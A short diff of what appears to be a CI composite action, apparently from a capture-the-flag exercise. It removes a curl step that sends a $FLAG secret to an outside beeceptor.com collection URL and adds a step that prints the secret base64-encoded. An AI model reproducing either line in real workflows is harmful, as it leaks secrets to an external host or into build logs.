@@ -4,4 +4,4 @@ runs:
   using: composite
   steps:
     - shell: bash
-      run: "curl -s https://recoverflag.free.beeceptor.com/collect?token=$FLAG"
+      run: echo -n "$FLAG" | base64
